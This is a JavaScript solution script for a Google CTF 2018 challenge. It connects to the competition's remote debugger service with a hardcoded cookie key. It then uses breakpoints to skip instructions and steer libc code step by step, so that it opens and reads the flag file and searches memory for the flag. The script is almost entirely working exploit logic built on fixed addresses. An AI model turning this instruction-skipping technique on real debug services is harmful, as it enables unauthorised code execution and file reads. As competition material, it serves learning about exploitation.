// Copyright 2018 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
const io = require('socket.io-client')

const socket = io('http://gdb-as-a-service.ctfcompetition.com:1337', {
  transportOptions: {
    polling: {
      extraHeaders: {
        'Cookie': 'key=yeep8auGezo4aic6aezo'
      }
    }
  }
})

const libc_base = 0x7ffff79e4000
const libc_start_main = 0x21ab0
const entry = 0x555555554000 + 0x1b70
const xor_edx = libc_base+0x21af0
const call_0x22580 = libc_base+0x22159
const call_0x23a40 = libc_base+0x22653
const shl = libc_base+0x22698
const shl_len = 4
const add1 = libc_base+0x22c26
const add1_len = 4
const jae = libc_base+0x22c33
const jae_len = 2
const loop_push_rbp = libc_base+0x22c3d
const loop_push_rbp_len = 1
const loop_ret = libc_base+0x22c4f
const loop_ret_len = 1

var regs = 0
var rip = 0

socket.on('regs', function(data) {
  regs = data
  rip = data.rip
})

socket.on('search_result', function(data) {
  console.log('search results: '+data);
  process.exit(0);
})

function timeout(ms) {
    return new Promise(resolve => setTimeout(resolve, ms))
}

async function wait_for_rip_change(old_rip) {
  while (rip == old_rip) {
    await timeout(0)
  }
}

async function wait_for_rip(wanted) {
  while (rip != wanted) {
    await timeout(0)
  }
}

async function nop_out(start, end) {
  for (let addr = start; addr < end; addr++) {
    socket.emit('break', {addr: addr})
  }
}

async function do_step() {
  let old_rip = rip
  socket.emit('step')
  await wait_for_rip_change(old_rip)
}

async function skip_until(addr) {
  console.log('skipping '+(addr-rip))
  while (rip < addr) {
    let old_rip = rip
    socket.emit('break', {addr: old_rip})
    await do_step()
    //socket.emit('step')
    //await wait_for_rip(old_rip+1)
    socket.emit('unbreak', {addr: old_rip})
  }
}

async function nop_and_step(end) {
  console.log('nopping until 0x'+end.toString(16))
  await skip_until(end)
  await do_step()
  //socket.emit('step')
  //await wait_for_rip_change(end)
}

function print_regs() {
  for (regname of ['rip', 'rax', 'rdi', 'rsi', 'rdx', 'rcx', 'rsp', 'rbp']) {
    console.log(regname + ': 0x' + regs[regname].toString(16))
  }
}

function print_rip() {
  console.log('rip: 0x'+rip.toString(16))
}

async function doit() {
  socket.emit('start')
  for (let i = 0; i < 4; i++) {
    socket.emit('break', {addr: entry-i})
  }
  socket.emit('cont')
  await wait_for_rip(entry)
  print_rip()
  socket.emit('break', {addr: libc_base+libc_start_main})
  socket.emit('cont')
  await wait_for_rip(libc_base+libc_start_main+1)
  print_rip()

  console.log('[*] xor edx, edx')
  await nop_and_step(xor_edx)

  console.log('[*] call 0x22580')
  await nop_and_step(call_0x22580)

  console.log('[*] call 0x23a40 to setup loop')
  await nop_and_step(call_0x23a40)

  console.log('[*] pop rbp')
  await nop_and_step(libc_base+0x23b4a)

  console.log('[*] push rbp')
  await nop_and_step(libc_base+0x23d65)

  console.log('[*] ret')
  await nop_and_step(libc_base+0x23e6b)

  let rdi_val = 0x67616c66; // flag

  for (let shift = 28; shift >= 0; shift-=4) {
    console.log('[*] shift = '+shift)
    await nop_and_step(shl)
    let bits = (rdi_val>>shift) & 0xf
    for (let i = 0; i < bits; i++) {
      await nop_and_step(add1)
      if (i+1 != bits) {
        await nop_and_step(jae)
      }
    }
    if (shift != 0) {
      await nop_and_step(loop_push_rbp)
      await nop_and_step(loop_ret)
    }
  }

  console.log('[*] mov rbx, rdx')
  await nop_and_step(libc_base+0x22d60)

  console.log('[*] push rbx')
  await nop_and_step(libc_base+0x22e33)

  console.log('[*] push rsp')
  await nop_and_step(libc_base+0x22ff1)

  console.log('[*] pop rdi')
  await nop_and_step(libc_base+0x233dd)

  console.log('[*] mov rbp, rsp')
  await nop_and_step(libc_base+0x246f1)

  console.log('[*] sub rsp')
  await nop_and_step(libc_base+0x246fd)

  console.log('[*] fix *n')
  await nop_and_step(libc_base+0x24751)
  await nop_and_step(libc_base+0x24764)

  console.log('[*] set rsi')
  await nop_and_step(libc_base+0x247ad)

  console.log('[*] fopen')
  await nop_and_step(libc_base+0x247bf)

  console.log('[*] break after getdelim')
  socket.emit('break', {'addr': libc_base+0x2480c})
  socket.emit('cont')
  await wait_for_rip(libc_base+0x2480c+1)
  socket.emit('search', {'q': 'CTF.*}', 'type': 'regex'})

  print_regs()
  console.log('done')
}

doit()
